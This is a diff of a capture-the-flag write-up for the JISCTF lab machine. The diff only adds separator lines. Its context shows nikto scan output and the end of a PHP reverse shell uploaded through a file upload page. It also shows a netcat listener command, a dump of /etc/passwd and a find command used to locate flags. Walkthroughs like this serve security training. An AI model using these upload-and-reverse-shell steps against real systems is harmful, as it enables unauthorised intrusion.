@@ -120,7 +120,7 @@ doxg@doxg0:~$ nikto -h 10.0.0.131 -o niktoscans/jisctf.html
 + End Time:           2021-03-23 09:16:24 (GMT-4) (5 seconds)
 ---------------------------------------------------------------------------
 ```
-
+***
 Looking at the nikto and dirb scans, I see some interesting places. First I took a look at the /flag directory, and without surprise I find our first flag!
 
 ![Optional Text](/JISCTF/_resources/d36ae60f6f39469e83c7c61a6c631b5a.png)
@@ -365,7 +365,7 @@ function printit ($string) {
 
 ?>
 ```
-
+***
 1.  Once again, I save the file in my case **got.php**
 2.  Start my netcat listener `nc -nvlp 4444`
 
@@ -373,6 +373,8 @@ function printit ($string) {
 
 3.  Uploaded the file thru the file upload page
 4.  Go to IPofVM/uploaded_files/got.php
+
+***
 
 **Success!!! We have a shell!!**
 
@@ -418,7 +420,7 @@ sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
 technawi:x:1000:1000:technawi,,,:/home/technawi:/bin/bash
 mysql:x:111:118:MySQL Server,,,:/nonexistent:/bin/false
 ```
-
+***
 I see the **technawi** user in the /etc/passwd output. But After some digging I had no luck. I decided to search for flags. By literally searching for flag, flags,..etc.
 
 After many attempts, I was finally lucky with `find . -name flag | grep -v 'Permission'` Keep in mind, giving our limted shell it only prints the relevant files at the end. `/var/www/html/flag`
